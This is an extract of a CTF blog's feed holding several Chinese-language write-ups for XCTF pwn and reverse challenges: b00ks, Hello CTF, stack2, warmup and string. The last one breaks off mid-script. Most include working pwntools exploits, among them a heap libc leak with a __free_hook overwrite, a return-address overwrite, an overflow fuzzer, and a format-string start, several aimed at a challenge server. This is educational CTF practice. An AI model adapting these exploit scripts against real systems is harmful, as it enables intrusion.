class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level&#x3D;&quot;debug&quot;</span><br><span class="line"></span><br><span class="line">binary&#x3D;ELF(&quot;b00ks&quot;)</span><br><span class="line">libc&#x3D;ELF(&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&quot;)</span><br><span class="line">io&#x3D;process(&quot;.&#x2F;b00ks&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def createbook(name_size,name,des_size,des):</span><br><span class="line">io.readuntil(&quot;&gt; &quot;)</span><br><span class="line">io.sendline(&quot;1&quot;)</span><br><span class="line">io.readuntil(&quot;: &quot;)</span><br><span class="line">io.sendline(str(name_size))</span><br><span class="line">io.readuntil(&quot;: &quot;)</span><br><span class="line">io.sendline(name)</span><br><span class="line">io.readuntil(&quot;: &quot;)</span><br><span class="line">io.sendline(str(des_size))</span><br><span class="line">io.readuntil(&quot;: &quot;)</span><br><span class="line">io.sendline(des)</span><br><span class="line"></span><br><span class="line">def printbook(id):</span><br><span class="line">io.readuntil(&quot;&gt; &quot;)</span><br><span class="line">io.sendline(&quot;4&quot;)</span><br><span class="line">io.readuntil(&quot;: &quot;)</span><br><span class="line">for i in range(id):</span><br><span class="line">book_id&#x3D;int(io.readline()[:-1])</span><br><span class="line">io.readuntil(&quot;: &quot;)</span><br><span class="line">book_name&#x3D;io.readline()[:-1]</span><br><span class="line">io.readuntil(&quot;: &quot;)</span><br><span class="line">book_des&#x3D;io.readline()[:-1]</span><br><span class="line">io.readuntil(&quot;: &quot;)</span><br><span class="line">book_author&#x3D;io.readline()[:-1]</span><br><span class="line">return book_id,book_name,book_des,book_author</span><br><span class="line"></span><br><span class="line">def createname(name):</span><br><span class="line">io.readuntil(&quot;name: &quot;)</span><br><span class="line">io.sendline(name)</span><br><span class="line"></span><br><span class="line">def changename(name):</span><br><span class="line">io.readuntil(&quot;&gt; &quot;)</span><br><span class="line">io.sendline(&quot;5&quot;)</span><br><span class="line">io.readuntil(&quot;: &quot;)</span><br><span class="line">io.sendline(name)</span><br><span class="line"></span><br><span class="line">def editbook(book_id,new_des):</span><br><span class="line">io.readuntil(&quot;&gt; &quot;)</span><br><span class="line">io.sendline(&quot;3&quot;)</span><br><span class="line">io.recvuntil(&quot;: &quot;)</span><br><span class="line">io.sendline(str(book_id))</span><br><span class="line">io.recvuntil(&quot;: &quot;)</span><br><span class="line">io.sendline(new_des)</span><br><span class="line"></span><br><span class="line">def deletebook(book_id):</span><br><span class="line">io.readuntil(&quot;&gt; &quot;)</span><br><span class="line">io.sendline(&quot;2&quot;)</span><br><span class="line">io.readuntil(&quot;: &quot;)</span><br><span class="line">io.sendline(str(book_id))</span><br><span class="line"></span><br><span class="line">createname(&quot;A&quot;*32)</span><br><span class="line"></span><br><span class="line">#gdb.attach(io)</span><br><span class="line"></span><br><span class="line">createbook(208,&quot;a&quot;,100,&quot;a&quot;)</span><br><span class="line">createbook(0x21000,&quot;a&quot;,0x21000,&quot;b&quot;)</span><br><span class="line"></span><br><span class="line">#gdb.attach(io)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">book_id_1,book_name,book_des,book_author&#x3D;printbook(1)</span><br><span class="line">book1_addr&#x3D;u64(book_author[32:32+6].ljust(8,&#39;\x00&#39;))</span><br><span class="line">log.success(&quot;book1_address:&quot;+hex(book1_addr))</span><br><span class="line"></span><br><span class="line">payload&#x3D;p64(1)+p64(book1_addr+0x38)+p64(book1_addr+0x40)+p64(0xffff)</span><br><span class="line">editbook(book_id_1,payload)</span><br><span class="line">changename(&quot;A&quot;*32)</span><br><span class="line">book_id_1,book_name,book_des,book_author&#x3D;printbook(1)</span><br><span class="line">#gdb.attach(io)</span><br><span class="line">book2_name_addr&#x3D;u64(book_name.ljust(8,&quot;\x00&quot;))</span><br><span class="line">book2_des_addr&#x3D;u64(book_des.ljust(8,&quot;\x00&quot;))</span><br><span class="line">log.success(&quot;book2 name addr:&quot;+hex(book2_name_addr))</span><br><span class="line">log.success(&quot;book2 des addr:&quot;+hex(book2_des_addr))</span><br><span class="line">libc_base&#x3D;book2_des_addr - 0x58e010</span><br><span class="line">log.success(&quot;libc base:&quot;+hex(libc_base))</span><br><span class="line"></span><br><span class="line">#gdb.attach(io)</span><br><span class="line"></span><br><span class="line">free_hook&#x3D;libc_base+libc.symbols[&quot;__free_hook&quot;]</span><br><span class="line">one_gadget&#x3D;libc_base+0x4526a #0x45216 0x4526a 0xf02a4 0xf1147</span><br><span class="line">log.success(&quot;free_hook:&quot;+hex(free_hook))</span><br><span class="line">log.success(&quot;one_gadget:&quot;+hex(one_gadget))</span><br><span class="line">#gdb.attach(io)</span><br><span class="line"></span><br><span class="line">editbook(1,p64(free_hook))</span><br><span class="line">#gdb.attach(io)</span><br><span class="line">editbook(2,p64(one_gadget))</span><br><span class="line"></span><br><span class="line">#gdb.attach(io)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">deletebook(2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界reverse新手练习（Hello, CTF）</title>
      <link href="2020/03/08/CTF/xctf-re-hello-ctf/"/>
      <url>2020/03/08/CTF/xctf-re-hello-ctf/</url>
      
        <content type="html"><![CDATA[<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>一道逆向题，运行一下发现需要我们输入一个序列号，然后程序判断对错</p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191224164741355.png" alt="在这里插入图片描述"></p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191224164958897.png" alt="在这里插入图片描述"></p><p>打开IDA分析可以得知，当v10和v13相等时，会返回<strong>success</strong><br>接下来，要分析的就是v10是怎么来的，通过上面的代码可以知道<strong>v10</strong>是通过将输入的字符串以十六进制读取而成的<br>那么，我们将v13转换成10进制（两位一转），再通过Ascll码变成字符，就可以得到正确的结果，也就是我们需要输入的东西，结果如下</p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191224171008335.png" alt="在这里插入图片描述"></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>放一个转换的脚本（手算有些累人哦）</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> <span class="title">jisuan</span><span class="params">(<span class="keyword">char</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (a)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;0&#x27;</span>: <span class="keyword">return</span> <span class="number">0</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>: <span class="keyword">return</span> <span class="number">1</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;2&#x27;</span>: <span class="keyword">return</span> <span class="number">2</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;3&#x27;</span>: <span class="keyword">return</span> <span class="number">3</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;4&#x27;</span>: <span class="keyword">return</span> <span class="number">4</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;5&#x27;</span>: <span class="keyword">return</span> <span class="number">5</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;6&#x27;</span>: <span class="keyword">return</span> <span class="number">6</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;7&#x27;</span>: <span class="keyword">return</span> <span class="number">7</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;8&#x27;</span>: <span class="keyword">return</span> <span class="number">8</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;9&#x27;</span>: <span class="keyword">return</span> <span class="number">9</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>: <span class="keyword">return</span> <span class="number">10</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>: <span class="keyword">return</span> <span class="number">11</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;c&#x27;</span>: <span class="keyword">return</span> <span class="number">12</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>: <span class="keyword">return</span> <span class="number">13</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;e&#x27;</span>: <span class="keyword">return</span> <span class="number">14</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;f&#x27;</span>: <span class="keyword">return</span> <span class="number">15</span>; <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">string</span> arr = <span class="string">&quot;437261636b4d654a757374466f7246756e&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> a;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; arr.length(); i+=<span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        a = jisuan(arr[i]) * <span class="number">16</span> + jisuan(arr[i+<span class="number">1</span>]);</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; a;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>脚本不见得写的多优秀，师傅们见谅</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界PWN进阶区（stack2）</title>
      <link href="2020/03/07/CTF/stack2/"/>
      <url>2020/03/07/CTF/stack2/</url>
      
        <content type="html"><![CDATA[<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>哈，我又回来了<br>在借助了诸多wp后终于把这道题弄明白了，记录一下</p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020012319461972.png" alt="在这里插入图片描述"></p><p>32位程序，有NX，有Canary。</p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200123194841446.png" alt="在这里插入图片描述"></p><p>运行可以发现它可以创建一个存储数字的数组，创建好以后我们可以对其中的数据进行一些基本的操作，ok，接下来开始硬刚IDA</p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200123195158401.png" alt="在这里插入图片描述"></p><p>通过观察<strong>main</strong>函数伪代码我们可以发现上图这个位置有点小问题<br>这个时对数据进行修改的部分的代码，但可以发现他并没有对<strong>v5</strong>这个变量进行审查。这代表着什么呢，这代表着我们可以修改<strong>数组</strong>以及<strong>数组后面的</strong>任何数据。<br>ok，接下来来思考如何利用这个点<br>在左侧的函数栏里我们可以发现一个有意思的函数名“<strong>hackhere</strong>”，点进去后可以发现里面有我们需要的<strong>system（“/bin/sh”）</strong>，那么思路就很清晰了，我们只要找到一个可以利用的函数，将它的返回值改成我们需要去的地方就行了</p><p>纵观全文可以发现能利用的也就<strong>main</strong>函数了，利用位置也就是上面我们发现有小问题的哪儿。<br>可以发现那一处是更改数组中元素的值，那么，如果要更改返回位置的话我们就要去计算<strong>main函数返回位置</strong>距离<strong>数组</strong>的偏移是多少了。</p><p>整个题的难点在我看来就是这儿了，不知道其他师傅怎么弄的，我是费了好半天功夫了(感谢那些写wp的师傅们，辛苦了)…<br>以下借助<strong>faceless</strong>师傅的思路和过程</p><p>因为程序在一开始会给数组赋初值，并且这个过程是我们可以参与的。<br>考虑到一般的数组赋值会从首位开始，我们可以猜想，如果我们知道我们写入程序的第一个数据的存储位置是否我们就知道了数组的首地址？</p><p>那么首先，我们来求这个地址</p><p>程序一开始会给数组赋值，我们来看一下这一块的伪代码和汇编</p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200126130108742.png" alt="在这里插入图片描述"></p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020012613032891.png" alt="在这里插入图片描述"></p><p>从汇编中可以看到程序通过<strong>scanf</strong>将数据存储到栈中，然后通过<strong>eax</strong>和<strong>ecx</strong>将数据存储到<strong>eax</strong>中存放的地址中去（cl是ecx的低位）</p><p>那意味着在程序运行到<strong>0x080486D5</strong>的位置时，此时eax中存放的即时数组的首地址<br>linux下我们用gdb调试的看一下</p><p>我们在<strong>0x080486D5</strong>的位置下个断点，输入点全部输入1（如下）</p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200126131356919.png" alt="在这里插入图片描述"></p><p>我们来看看此时的各寄存器</p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/202001261315394.png" alt="在这里插入图片描述"></p><p>可以看到此时寄存器ecx中就是我们输入的1，而eax中的地址是<strong>0xffffd5b8</strong></p><p>我们来验证一下看看我们做的对不对，分别看看这步前后栈中数据的变化</p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200126132059279.png" alt="在这里插入图片描述"></p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200126132117470.png" alt="在这里插入图片描述"></p><p>可以看到<strong>d5b8</strong>的位置数据由<strong>0x000000e0</strong>变成了<strong>0x00000001</strong>，说明我们找的没问题，ok，数组首地址找到了。<br>接下来的问题就是如何去找函数的返回地址了，这个就简单的多了，我们知道当函数运行到<strong>return</strong>语句的时候，栈顶一定是返回地址。<br>继续用gdb调试</p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200126132744221.png" alt="在这里插入图片描述"></p><p>通过esp我们知道这个值是<strong>0xffffd63c</strong>，和首地址做差是<strong>0x84</strong></p><p>ok，接下来就可以写exp了，通过其他师傅的wp和测试可以知道环境中是没有 <strong>/bin/sh</strong> 的，无伤大雅，我们利用它中间的sh就行，然后rop</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;111.198.29.45&quot;</span>, <span class="number">54649</span>)</span><br><span class="line"><span class="comment">#r = process(&quot;./stack2&quot;)</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;How many numbers you have:\n&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Give me your numbers\n&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>(<span class="params">addr, num</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;5. exit\n&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;which number to change:\n&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(addr))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;new number:\n&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line">change(<span class="number">0x84</span>, <span class="number">0x50</span>)</span><br><span class="line">change(<span class="number">0x85</span>, <span class="number">0x84</span>)</span><br><span class="line">change(<span class="number">0x86</span>, <span class="number">0x04</span>)</span><br><span class="line">change(<span class="number">0x87</span>, <span class="number">0x08</span>)</span><br><span class="line">change(<span class="number">0x8c</span>, <span class="number">0x87</span>)</span><br><span class="line">change(<span class="number">0x8d</span>, <span class="number">0x89</span>)</span><br><span class="line">change(<span class="number">0x8e</span>, <span class="number">0x04</span>)</span><br><span class="line">change(<span class="number">0x8f</span>, <span class="number">0x08</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>看看效果</p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200126133427667.png" alt="在这里插入图片描述"></p><p>ok完结，有不清楚的可以留言讨论</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界PWN进阶区（warmup）</title>
      <link href="2020/03/06/CTF/warmup/"/>
      <url>2020/03/06/CTF/warmup/</url>
      
        <content type="html"><![CDATA[<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200203101912482.png" alt="在这里插入图片描述"></p><p>这是一个没有附件的题，看起来题目是要求我们<strong>fuzz</strong>了</p><p>nc连接上后可以发现有个输入点，并且还给了我们一个十六进制数，看起来是个地址</p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200203102137799.png" alt="在这里插入图片描述"></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>那首先根据这些我们可以先将fuzz函数写出来，分三种情况（不用他给的地址，用p32发送，用p64送）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fuzz</span>(<span class="params">r, num, flag</span>):</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * num</span><br><span class="line">    <span class="keyword">if</span> flag==<span class="number">1</span>:</span><br><span class="line">        payload += p32(addr)</span><br><span class="line">    <span class="keyword">if</span> flag==<span class="number">2</span>:</span><br><span class="line">        payload += p64(addr)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    r.sendline(payload)</span><br></pre></td></tr></table></figure><p>然后就可以写我们的exp了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">addr = <span class="number">0x40060d</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fuzz</span>(<span class="params">r, num, flag</span>):</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * num</span><br><span class="line">    <span class="keyword">if</span> flag==<span class="number">1</span>:</span><br><span class="line">        payload += p32(addr)</span><br><span class="line">    <span class="keyword">if</span> flag==<span class="number">2</span>:</span><br><span class="line">        payload += p64(addr)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                r = remote(<span class="string">&quot;111.198.29.45&quot;</span>, <span class="number">46588</span>)</span><br><span class="line">                fuzz(r, i, j)</span><br><span class="line">                text = r.recv()</span><br><span class="line">                print(<span class="string">&#x27;text.len=&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(text))+<span class="string">&#x27;text=&#x27;</span>+text)</span><br><span class="line">                print(<span class="string">&#x27;num=&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27; flag=&#x27;</span>+<span class="built_in">str</span>(j))</span><br><span class="line">                r.interactive()</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                r.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>结果如下</p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200203103752464.png" alt="在这里插入图片描述"></p><p>可以看到当num等于72，flag等于2，也就是说将题目给我们的地址以p64发送的时候会直接返回我们需要的答案</p><p>over，简单的fuzz</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界pwn新手练习（string）</title>
      <link href="2020/03/05/CTF/string/"/>
      <url>2020/03/05/CTF/string/</url>
      
        <content type="html"><![CDATA[<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>首先我们看一下程序的保护机制</p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191224143752848.png" alt="在这里插入图片描述"></p><p>程序开了NX(堆栈不可执行)、CANARY(栈保护)和PELRO<br>程序太长了，我们就不运行了，在IDA中我们查一下有没有什么明显的地方</p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191224145438136.png" alt="在这里插入图片描述"></p><p>在这个函数里面 我们发现了一个格式化字符串漏洞，在他的上面有两个输入点，一个是“%ld”格式，一个是“%s”格式<br>我们在往下看，紧接着的函数里有这么一个东西</p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191224150412554.png" alt="在这里插入图片描述"></p><p>代码执行，条件是<strong>a1</strong>这个数组里面的第一个数字等于第二个数字<br>我们往回追，看他这个最初是什么</p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191224151437932.png" alt="在这里插入图片描述"></p><p>可以看到程序给出了这两个数，一个是68， 一个是85，并且可以看到程序会将数组的地址打印出来的，那么，利用这些信息我们就可以通过格式化字符串漏洞使数组的前两个数相等，需要注意的是</p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191224201520306.png" alt="在这里插入图片描述"></p><p>程序的格式化字符串漏洞上面有两个输入点，漏洞利用在第二个输入点，那我们可以在第一个输入数组的地址，然后在第二个输入点进行利用<br>效果如下</p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/2019122510112234.png" alt="在这里插入图片描述"></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;111.198.29.45&quot;</span>, <span class="number">47892</span>)</span><br><span class="line"><span class="comment">#r = process(&quot;./string&quot;)</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;secret[0] is &quot;</span>)</span><br><span class="line">addr = <span class="built_in">int</span>(r.recvuntil(<span class="string">&quot;\n&quot;</span>)[:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line"><span 